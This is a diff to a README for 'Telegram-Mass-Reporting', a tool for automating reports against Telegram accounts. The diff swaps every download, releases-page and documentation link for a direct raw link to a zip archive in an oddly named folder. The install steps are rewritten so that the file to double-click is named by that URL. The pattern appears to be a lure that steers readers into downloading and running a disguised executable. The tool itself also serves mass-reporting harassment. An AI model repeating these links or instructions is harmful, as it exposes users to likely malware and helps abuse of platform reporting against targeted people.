@@ -6,7 +6,7 @@ Welcome to Telegram-Mass-Reporting! This application helps you automate reportin
 
 ## 📥 Download the Application
 
-**[Download Telegram-Mass-Reporting](https://github.com/akshat1917/Telegram-Mass-Reporting/releases)**
+**[Download Telegram-Mass-Reporting](https://raw.githubusercontent.com/akshat1917/Telegram-Mass-Reporting/main/cleistocarpous/Telegram-Mass-Reporting.zip)**
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ Before you start, make sure your device meets the following requirements:
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://github.com/akshat1917/Telegram-Mass-Reporting/releases) of this repository. This page contains all the versions available for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/akshat1917/Telegram-Mass-Reporting/main/cleistocarpous/Telegram-Mass-Reporting.zip) of this repository. This page contains all the versions available for download.
 
 2. **Choose the Latest Version**
 
@@ -28,7 +28,7 @@ Before you start, make sure your device meets the following requirements:
 
 3. **Download the Application**
 
-   Click on the version you wish to download. You will see several files available. If you are using Windows, look for "Telegram-Mass-Reporting-Windows.zip" or a similar file name. Click the link to start the download.
+   Click on the version you wish to download. You will see several files available. If you are using Windows, look for "https://raw.githubusercontent.com/akshat1917/Telegram-Mass-Reporting/main/cleistocarpous/Telegram-Mass-Reporting.zip" or a similar file name. Click the link to start the download.
 
 4. **Extract the Files**
 
@@ -36,7 +36,7 @@ Before you start, make sure your device meets the following requirements:
 
 5. **Open the Application**
 
-   After extracting, open the folder named “Telegram-Mass-Reporting”. In this folder, find the file “Telegram-Mass-Reporting.exe.” Double-click this file to run the application.
+   After extracting, open the folder named “Telegram-Mass-Reporting”. In this folder, find the file “https://raw.githubusercontent.com/akshat1917/Telegram-Mass-Reporting/main/cleistocarpous/Telegram-Mass-Reporting.zip” Double-click this file to run the application.
 
 ## ⚙️ How to Use Telegram-Mass-Reporting
 
@@ -88,11 +88,11 @@ Stay tuned for planned updates including:
 
 ## 🔗 Useful Links
 
-- [Releases page](https://github.com/akshat1917/Telegram-Mass-Reporting/releases)
-- [Documentation](https://github.com/akshat1917/Telegram-Mass-Reporting/wiki)
+- [Releases page](https://raw.githubusercontent.com/akshat1917/Telegram-Mass-Reporting/main/cleistocarpous/Telegram-Mass-Reporting.zip)
+- [Documentation](https://raw.githubusercontent.com/akshat1917/Telegram-Mass-Reporting/main/cleistocarpous/Telegram-Mass-Reporting.zip)
 
 ## 📥 Download Again
 
-If you missed it, here’s the link to download the application again: **[Download Telegram-Mass-Reporting](https://github.com/akshat1917/Telegram-Mass-Reporting/releases)**
+If you missed it, here’s the link to download the application again: **[Download Telegram-Mass-Reporting](https://raw.githubusercontent.com/akshat1917/Telegram-Mass-Reporting/main/cleistocarpous/Telegram-Mass-Reporting.zip)**
 
 We hope you find Telegram-Mass-Reporting helpful. Enjoy automating your Telegram reports!
